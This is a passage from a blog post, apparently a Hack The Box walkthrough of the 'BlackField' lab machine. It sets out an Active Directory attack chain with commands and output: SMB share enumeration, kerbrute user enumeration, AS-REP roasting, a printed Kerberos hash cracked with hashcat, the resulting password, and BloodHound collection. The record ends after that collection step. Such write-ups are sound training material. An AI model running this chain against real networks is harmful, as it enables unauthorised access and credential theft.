<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><title>BlackField | Gemstone-Hashghost</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="BlackField" /><meta name="author" content="Julius Soraely" /><meta property="og:locale" content="en_US" /><meta name="description" content="Enumeration Command 1 nmap -sC -sV -oN nmap-scan -Pn 10.10.10.192 Nmap Scan Result ``` Nmap 7.93 scan initiated Tue Dec 20 13:29:51 2022 as: nmap -sC -sV -oN nmap-scan -Pn 10.10.10.192 Nmap scan report for 10.10.10.192 Host is up (0.25s latency). Scanned at 2022-12-20 13:29:52 EAT for 143s Not shown: 993 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-20 17:30:34Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows" /><meta property="og:description" content="Enumeration Command 1 nmap -sC -sV -oN nmap-scan -Pn 10.10.10.192 Nmap Scan Result ``` Nmap 7.93 scan initiated Tue Dec 20 13:29:51 2022 as: nmap -sC -sV -oN nmap-scan -Pn 10.10.10.192 Nmap scan report for 10.10.10.192 Host is up (0.25s latency). Scanned at 2022-12-20 13:29:52 EAT for 143s Not shown: 993 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-20 17:30:34Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows" /><link rel="canonical" href="http://localhost:4000/blackfield/" /><meta property="og:url" content="http://localhost:4000/blackfield/" /><meta property="og:site_name" content="Gemstone-Hashghost" /><meta property="og:image" content="http://localhost:4000/assets/img/blackfield/Blackfield.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-12-20T18:49:38+03:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/blackfield/Blackfield.png" /><meta property="twitter:title" content="BlackField" /><meta name="twitter:site" content="@hashghost21" /><meta name="twitter:creator" content="@Julius Soraely" /><meta name="google-site-verification" content="CtBtIysuQ8b6k36FI7jqU-o34DRoA_sye50a-RNtPPY" /> <script type="application/ld+json"> {"headline":"BlackField","dateModified":"2022-12-20T18:49:38+03:00","datePublished":"2022-12-20T18:49:38+03:00","author":{"@type":"Person","name":"Julius Soraely"},"@type":"BlogPosting","url":"http://localhost:4000/blackfield/","description":"Enumeration Command 1 nmap -sC -sV -oN nmap-scan -Pn 10.10.10.192 Nmap Scan Result ``` Nmap 7.93 scan initiated Tue Dec 20 13:29:51 2022 as: nmap -sC -sV -oN nmap-scan -Pn 10.10.10.192 Nmap scan report for 10.10.10.192 Host is up (0.25s latency). Scanned at 2022-12-20 13:29:52 EAT for 143s Not shown: 993 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-20 17:30:34Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows","image":"http://localhost:4000/assets/img/blackfield/Blackfield.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blackfield/"},"@context":"https://schema.org"}</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>BlackField | Gemstone-Hashghost</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="BlackField" /><meta name="author" content="Julius Soraely" /><meta property="og:locale" content="en_US" /><meta name="description" content="Enumeration Command 1 nmap -sC -sV -oN nmap-scan -Pn 10.10.10.192 Nmap Scan Result ``` Nmap 7.93 scan initiated Tue Dec 20 13:29:51 2022 as: nmap -sC -sV -oN nmap-scan -Pn 10.10.10.192 Nmap scan report for 10.10.10.192 Host is up (0.25s latency). Scanned at 2022-12-20 13:29:52 EAT for 143s Not shown: 993 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-20 17:30:34Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows" /><meta property="og:description" content="Enumeration Command 1 nmap -sC -sV -oN nmap-scan -Pn 10.10.10.192 Nmap Scan Result ``` Nmap 7.93 scan initiated Tue Dec 20 13:29:51 2022 as: nmap -sC -sV -oN nmap-scan -Pn 10.10.10.192 Nmap scan report for 10.10.10.192 Host is up (0.25s latency). Scanned at 2022-12-20 13:29:52 EAT for 143s Not shown: 993 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-20 17:30:34Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows" /><link rel="canonical" href="http://localhost:4000/blackfield/" /><meta property="og:url" content="http://localhost:4000/blackfield/" /><meta property="og:site_name" content="Gemstone-Hashghost" /><meta property="og:image" content="http://localhost:4000/assets/img/blackfield/Blackfield.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-12-20T18:49:38+03:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/blackfield/Blackfield.png" /><meta property="twitter:title" content="BlackField" /><meta name="twitter:site" content="@hashghost21" /><meta name="twitter:creator" content="@Julius Soraely" /><meta name="google-site-verification" content="CtBtIysuQ8b6k36FI7jqU-o34DRoA_sye50a-RNtPPY" /> <script type="application/ld+json"> {"headline":"BlackField","dateModified":"2022-12-20T18:49:38+03:00","datePublished":"2022-12-20T18:49:38+03:00","author":{"@type":"Person","name":"Julius Soraely"},"@type":"BlogPosting","url":"http://localhost:4000/blackfield/","description":"Enumeration Command 1 nmap -sC -sV -oN nmap-scan -Pn 10.10.10.192 Nmap Scan Result ``` Nmap 7.93 scan initiated Tue Dec 20 13:29:51 2022 as: nmap -sC -sV -oN nmap-scan -Pn 10.10.10.192 Nmap scan report for 10.10.10.192 Host is up (0.25s latency). Scanned at 2022-12-20 13:29:52 EAT for 143s Not shown: 993 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-20 17:30:34Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows","image":"http://localhost:4000/assets/img/blackfield/Blackfield.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blackfield/"},"@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">Gemstone-Hashghost</a></div><div class="site-subtitle font-italic">Computer Networks | InfoSec Engineer</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-home"></i> HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-stream"></i> CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-tags"></i> TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-archive"></i> ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-id-card"></i> ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/gemstone-source" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/hashghost21" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['sophiajulius5','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/990235" target="_blank"> <i class="fas fa-cube"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>BlackField</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>BlackField</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Dec 20, 2022, 6:49 PM +0300" > Dec 20, 2022 <i class="unloaded">2022-12-20T18:49:38+03:00</i> </span> by <span class="author"> Julius Soraely </span></div></div><div class="post-content"> <img src="/assets/img/blackfield/Blackfield.png" class="post-preview-img"><h2 id="enumeration">Enumeration</h2><p><strong>Command</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap -sC -sV -oN nmap-scan -Pn 10.10.10.192
</pre></table></code></div></div><h3 id="nmap-scan">Nmap Scan</h3><p><strong>Result</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre># Nmap 7.93 scan initiated Tue Dec 20 13:29:51 2022 as: nmap -sC -sV -oN nmap-scan -Pn 10.10.10.192
Nmap scan report for 10.10.10.192
Host is up (0.25s latency).
Scanned at 2022-12-20 13:29:52 EAT for 143s
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-20 17:30:34Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-12-20T17:31:37
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48702/tcp): CLEAN (Timeout)
|   Check 2 (port 10784/tcp): CLEAN (Timeout)
|   Check 3 (port 8154/udp): CLEAN (Timeout)
|   Check 4 (port 53637/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 7h00m00s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 20 13:32:15 2022 -- 1 IP address (1 host up) scanned in 144.10 seconds
</pre></table></code></div></div><p>This is Windows machine and it can active directory. The important fields obtained from <code class="language-plaintext highlighter-rouge">nmap</code> includes the domain name of the machine which is <code class="language-plaintext highlighter-rouge">BLACKFIELD.local</code> add this to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p><h3 id="smb-enumeration">Smb Enumeration</h3><p>Checking if there is any share in <code class="language-plaintext highlighter-rouge">smb</code> service</p><p><strong>Command</strong> I tried <code class="language-plaintext highlighter-rouge">smbmap</code> only without providing an user and it refused to connect but when using <code class="language-plaintext highlighter-rouge">anonymous</code> or <code class="language-plaintext highlighter-rouge">guest</code> it return result.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
└─$ smbmap -H 10.10.10.192 -u anonymous 
</pre></table></code></div></div><p><strong>Result</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>[+] Guest session       IP: 10.10.10.192:445    Name: BLACKFIELD.local                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
</pre></table></code></div></div><p>There are to shares which are not default but we only have access to the <code class="language-plaintext highlighter-rouge">profiles$</code></p><h3 id="enumerating-profiles">Enumerating profiles$</h3><p><strong>Command</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
└─$ smbclient -N //10.10.10.192/profiles$ 
</pre></table></code></div></div><p><strong>List contents</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>smb: \&gt; dir                                                                                   
  .                                   D        0  Wed Jun  3 19:47:12 2020
  ..                                  D        0  Wed Jun  3 19:47:12 2020
  AAlleni                             D        0  Wed Jun  3 19:47:11 2020
  ABarteski                           D        0  Wed Jun  3 19:47:11 2020
  ABekesz                             D        0  Wed Jun  3 19:47:11 2020
  ABenzies                            D        0  Wed Jun  3 19:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 19:47:11 2020
  AChampken                           D        0  Wed Jun  3 19:47:11 2020
  ACheretei                           D        0  Wed Jun  3 19:47:11 2020
  ACsonaki                        
</pre></table></code></div></div><p>Listing files in this share resulted to some sort of usernames for the machine, hence copy them to the attacking machine and filter only names.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
└─$ cat user | awk '{print $1}' &gt; users.txt   
</pre></table></code></div></div><p>This list is too huge but there is a way to fine all valid users, this can done by using the tool known as <code class="language-plaintext highlighter-rouge">kerbrute</code> and this tool can be found in <a href="https://github.com/ropnop/kerbrute/releases/">kerbrute</a> and its syntax is shown below</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
└─$ ./kerbrute userenum --dc 10.10.10.192 -d blackfield.local -o validusers users.txt 
</pre></table></code></div></div><p>This will result into valid users and to clear the names we can use the following command:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
└─$ grep VALID  validusers | awk  '{print $7}' | awk -F \@ '{print $1}' &gt; creds/validusers
</pre></table></code></div></div><p>And the result will be</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>audit2020
svc_backup
support
</pre></table></code></div></div><h3 id="checking-for-uf_dont_require_preauth">Checking for ‘UF_DONT_REQUIRE_PREAUTH’</h3><p>This will require <code class="language-plaintext highlighter-rouge">impacket-GetNPUsers</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/creds]
└─$ impacket-GetNPUsers blackfield.local/ -usersfile validusers -dc-ip 10.10.10.192  -no-pass
</pre></table></code></div></div><p>Which results to</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$krb5asrep$23$support@BLACKFIELD.LOCAL:1108e631d6efac9107984b05d7e87a2c$e96fb3fd03e20f892260a2358a75acbed52d7616603869b8c879a35e72c5a7c8d61b092dcc7e2ba0321094b24659c3454f05bccf12505652ea2fbe78c9b5ffd891e4de50211dccd70032ac94ea84546b5e280edbb078d96092054e478a98d5539a1a10029d1926f455c2a3345768b922b2b266c7fadcd8e2a9063736a3197f6cb95ad7dd6adb6e10f46a67aef4795362b373ff464153001721dd6a17486d0153afa3414f1d3aac00ed38530abdb3b6aeb9071c1c76804d08fe68a05219e89ce3709acf4768d1342f3033706264a0ced34abd024ba3c0dee0cf82845ed497828ad4b4581ce8fe0c03df45b74d1beb8318469d19e8
</pre></table></code></div></div><p><strong>Crack hash</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/creds]
└─$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
</pre></table></code></div></div><p>This resulted into <code class="language-plaintext highlighter-rouge">#00^BlackKnight</code> which is password for the user <code class="language-plaintext highlighter-rouge">support</code></p><p>After this i tried <code class="language-plaintext highlighter-rouge">smbclient</code> and <code class="language-plaintext highlighter-rouge">smbmap</code> but it wasn’t successful then i decided to use <code class="language-plaintext highlighter-rouge">rpcclient</code> to check if there are other users</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/creds]
└─$ rpcclient -U "support" 10.10.10.192
</pre></table></code></div></div><p>It connected and to obtain users this command is used</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rpcclient $&gt; enumdomusers
</pre></table></code></div></div><p>Non of the new user brings interesting info then we ca continue with another thing</p><h3 id="collecting-data-by-using-bloodhound">Collecting Data by using BloodHound</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/bloodhound-data]
└─$ bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all
</pre></table></code></div></div><p><strong>Result</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/bloodhound-data]
└─$ ls
20221220160034_computers.json  20221220160034_domains.json  20221220160034_groups.json  20221220160034_users.json  
